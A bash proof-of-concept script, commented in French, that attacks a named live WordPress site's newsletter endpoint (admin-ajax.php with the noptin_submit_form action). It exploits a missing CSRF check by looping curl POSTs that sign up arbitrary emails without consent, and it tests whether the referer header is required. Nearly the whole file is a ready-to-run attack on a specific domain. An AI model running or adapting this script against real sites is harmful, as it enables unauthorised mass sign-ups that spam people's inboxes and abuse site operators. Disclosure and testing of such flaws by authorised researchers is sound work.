#!/bin/bash
# ============================================
#  CSRF MASS SUBSCRIPTION - PoC Script
#  Cible: cyberc4st.com
#  Vulnerabilite: Missing CSRF Token Validation
# ============================================

# Couleurs
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Configuration
TARGET="https://cyberc4st.com"
ENDPOINT="/wp-admin/admin-ajax.php"
URL="${TARGET}${ENDPOINT}"

# Banner
echo -e "${CYAN}"
echo "  ╔═══════════════════════════════════════════╗"
echo "  ║   CSRF Mass Subscription - PoC Script    ║"
echo "  ║   Cible: cyberc4st.com                   ║"
echo "  ║   Vulnerabilite: Missing Anti-CSRF      ║"
echo "  ╚═══════════════════════════════════════════╝"
echo -e "${NC}"

# Fonction pour tester une inscription
test_subscription() {
    local EMAIL=$1
    local LABEL=$2

    echo -e "${BLUE}[TEST]${NC} $LABEL"
    echo -e "${YELLOW}  URL: ${URL}${NC}"
    echo -e "${YELLOW}  Email: ${EMAIL}${NC}"

    RESPONSE=$(curl -sk -X POST "$URL" \
        -d "action=noptin_submit_form&email=${EMAIL}&_wp_http_referer=${TARGET}/" \
        -w "\nHTTP_CODE:%{http_code}")

    HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE" | cut -d: -f2)
    BODY=$(echo "$RESPONSE" | sed '/HTTP_CODE/d')

    echo -e "${YELLOW}  Response Body: ${BODY}${NC}"
    echo -e "${YELLOW}  HTTP Code: ${HTTP_CODE}${NC}"

    if [ "$BODY" = "0" ]; then
        echo -e "${GREEN}[✓] SUCCESS - Email ajoute a la newsletter!${NC}"
    else
        echo -e "${RED}[✗] FAILED - Reponse inattendue${NC}"
    fi
    echo ""
}

# ============================================
# TEST 1: Inscription Simple
# ============================================
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${CYAN}  TEST 1: Inscription Simple${NC}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

TIMESTAMP=$(date +%s)
EMAIL_TEST="csrf-poc-${TIMESTAMP}@test.com"

test_subscription "$EMAIL_TEST" "Test avec email unique et timestamp"

# ============================================
# TEST 2: Inscription avec referer
# ============================================
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${CYAN}  TEST 2: Inscription avec referer${NC}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

test_subscription "referer-test@test.com" "Test avec referer specifique"

# ============================================
# TEST 3: Inscription SANS referer
# ============================================
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${CYAN}  TEST 3: Inscription SANS referer${NC}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

echo -e "${YELLOW}[TEST] Test sans referer (verifie si le referer est requis)${NC}"
echo -e "${YELLOW}  URL: ${URL}${NC}"

RESPONSE=$(curl -sk -X POST "$URL" \
    -d "action=noptin_submit_form&email=noreferer@test.com" \
    -w "\nHTTP_CODE:%{http_code}")

HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE" | cut -d: -f2)
BODY=$(echo "$RESPONSE" | sed '/HTTP_CODE/d')

echo -e "${YELLOW}  Response: ${BODY}${NC}"

if [ "$BODY" = "0" ]; then
    echo -e "${GREEN}[✓] SUCCESS - Le referer n'est pas requis!${NC}"
    echo -e "${GREEN}[!] Impact: L'attaque peut etre lancee depuis n'importe quel site${NC}"
else
    echo -e "${RED}[✗] Le referer semble requis${NC}"
fi
echo ""

# ============================================
# TEST 4: Mass Subscription
# ============================================
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${CYAN}  TEST 4: Mass Subscription (5 emails)${NC}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

echo -e "${RED}[!] ATTENTION: Ce test envoie plusieurs inscriptions${NC}"
echo -e "${RED}[!] Usage legitime: Demontrer la capacite d'attaque massive${NC}"
echo ""

SUCCESS_COUNT=0
FAIL_COUNT=0

for i in 1 2 3 4 5; do
    EMAIL="mass-spam-${i}-$(date +%s)@poc.com"

    RESPONSE=$(curl -sk -X POST "$URL" \
        -d "action=noptin_submit_form&email=${EMAIL}&_wp_http_referer=${TARGET}/" \
        -w "\nHTTP_CODE:%{http_code}")

    BODY=$(echo "$RESPONSE" | sed '/HTTP_CODE/d')

    if [ "$BODY" = "0" ]; then
        echo -e "${GREEN}[✓] Email ${i}: ${EMAIL} - AJOUTE${NC}"
        ((SUCCESS_COUNT++))
    else
        echo -e "${RED}[✗] Email ${i}: ${EMAIL} - ECHOUE${NC}"
        ((FAIL_COUNT++))
    fi
done

echo ""
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${CYAN}  RÉSUMÉ DU TEST MASS SUBSCRIPTION${NC}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}  Succes: ${SUCCESS_COUNT}/5 inscriptions${NC}"
echo -e "${RED}  Echecs: ${FAIL_COUNT}/5 inscriptions${NC}"

if [ $SUCCESS_COUNT -eq 5 ]; then
    echo ""
    echo -e "${RED}[!] VULNERABILITE CONFIRMEE:${NC}"
    echo -e "${RED}    Un attaquant peut ajouter des milliers d'emails${NC}"
    echo -e "${RED}    a la newsletter sans le consentement des utilisateurs${NC}"
fi

echo ""
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${CYAN}  FIN DES TESTS${NC}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
